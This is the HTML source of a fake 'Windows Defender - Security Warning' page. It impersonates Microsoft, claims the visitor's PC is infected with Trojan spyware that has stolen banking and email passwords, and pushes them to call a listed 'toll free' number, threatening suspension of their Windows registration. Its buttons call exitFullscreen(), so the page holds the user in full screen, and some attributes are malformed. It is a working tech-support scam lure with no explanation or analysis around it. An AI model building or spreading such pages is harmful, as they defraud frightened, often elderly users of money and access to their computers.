<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="errorpage.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
</head>
<body>
    <div class="fullscreen-content">
    <div class="container">
        <div class="row">
            <div class="col-md-4 offset-lg-4">
                <div class="error-popup">
                    <div class="row">
                        <div class="col-md-12 d-flex justify-content-between align-items-center">
                            <div class="d-flex align-items-center">
                                <img src="shield.png" alt="" class="shield">
                            <h5>Security Services</h5>
                            </div>
                            <button class="btn-close" onclick="exitFullscreen()></button>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-md-12">
                            <div class="line-close"></div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-md-12 text-center">
                            <h6 class="text-center heading-color-1">Threat Detected: Trojan Spyware</h6>
                            <img src="shield.png" alt="" class="shield-1">
                            <h6 class="text-center">Access has been blocked for security reasons and for Safety</h6>
                            <h6 class="text-center heading-color">Call Windows Security Toll Free: +1-833-978-4846</h6>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-md-12">
                            <div class="line-close"></div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-md-12 d-flex justify-content-between">
                            <img src="microsoft-removebg-preview.png" alt="" class="microsoft">
                            <div>
                                <button class="btn btn-light" onclick="exitFullscreen()>Cancel</button>
                            <button class="btn btn-primary" onclick="exitFullscreen()>Scan</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="row">
            <div class="col-md-6 offset-lg-3">
                <div class="warning-popup">
                    <h4 class="text-center mb-3">Windows Defender - Security Warning</h4>
                    <p>**ACCESS TO THIS PC HAS BEEN BLOCKED FOR SECURITY REASONS **</p>
                    <p>Your computer has alerted us that it has been infected with a Trojan Spyware. The following data has been compromised</p>
                    <p>> Email Credentials <br>
                        > Banking Passwords <br>
                        > Facebook Login <br>
                        > Pictures & Documents</p>
                        <p>Windows Defender Scan has found potentially unwanted Adware on this device that can steal your passwords, online identity, financial information, personal files, pictures or documents.</p>
                        <p>You must contact us immediately so that our engineers can walk you through the removal process over the phone.</p>
                        <p>Call Microsoft Support immediately to report this threat, prevent identity theft and unlock access to this device.</p>
                        <p>Closing this window will put your personal information at risk and lead to a suspension of your Windows Registration.</p>
                </div>
            </div>
        </div>
    </div>

        </div>
</body>
</html>
